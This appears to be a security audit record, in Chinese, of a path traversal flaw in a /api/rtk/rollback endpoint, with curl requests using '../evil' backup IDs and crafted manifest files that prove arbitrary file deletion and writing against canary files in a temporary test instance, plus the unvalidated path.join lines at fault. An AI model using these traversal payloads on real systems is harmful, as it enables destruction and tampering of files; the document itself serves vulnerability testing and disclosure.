@@ -1,0 +1,29 @@
+# 路径穿越：POST /api/rtk/rollback（临时实例 8850，RTK_BACKUP_DIR=/tmp/cac-sec-HHj9Kr/backups，HOME=/tmp/cac-sec-HHj9Kr/home）
+
+## 1) 不存在的相对路径（对照组）
+$ curl -b ck3.txt -X POST /api/rtk/rollback -d {"backup":"../../etc","confirm":true}
+{"error":"备份 ../../etc 不存在","plane":"local","reason":"backup_not_found"} [HTTP 404]
+
+## 2) 任意文件删除：root 之外构造 manifest.json
+$ mkdir -p /tmp/cac-sec-HHj9Kr/evil
+$ cat /tmp/cac-sec-HHj9Kr/evil/manifest.json
+{"id":"evil","at":"2026-10-01T00:00:00.000Z","home":"/tmp/cac-sec-HHj9Kr/home","files":[{"rel":"pwned-canary.txt","existed":false}]}
+$ echo target-hit > /tmp/cac-sec-HHj9Kr/home/pwned-canary.txt   # 删除前存在
+$ curl -b ck3.txt -X POST /api/rtk/rollback -d {"backup":"../evil","confirm":true}
+HTTP 200，restored=["pwned-canary.txt"]
+删除后 /tmp/cac-sec-HHj9Kr/home/pwned-canary.txt: absent  ← 已被越界删除
+
+## 3) 任意文件写入（manifest 里的 rel 逃出 HOME）
+$ cat /tmp/cac-sec-HHj9Kr/evil2/manifest.json
+{"id":"evil2","at":"2026-10-01T00:00:00.000Z","files":[{"rel":"../../cac-sec-write-canary.txt","existed":true}]}
+$ printf "ARBITRARY-WRITE-PROOF\n" > "/tmp/cac-sec-HHj9Kr/evil2/..__..__cac-sec-write-canary.txt"   # rel 里的 / 换成 __
+$ curl -b ck3.txt -X POST /api/rtk/rollback -d {"backup":"../evil2","confirm":true}
+HTTP 200 {"backupId":"../evil2","restored":["../../cac-sec-write-canary.txt"]}
+写入结果 /tmp/cac-sec-write-canary.txt: ARBITRARY-WRITE-PROOF
+
+## 4) 审计留痕（能检测到，但事后）
+target=../evil / ../evil2 均落库，details 里含越界的 rel
+
+## 代码事实
+server/rtkService.ts:773 定义了 BACKUP_ID_PATTERN，但只在 listRtkBackups 里用于 recognized 标记，
+restoreRtkBackup() 直接 path.join(root, backupId)；manifest.files[].rel 也直接 path.join(home, rel)，两侧都无校验。
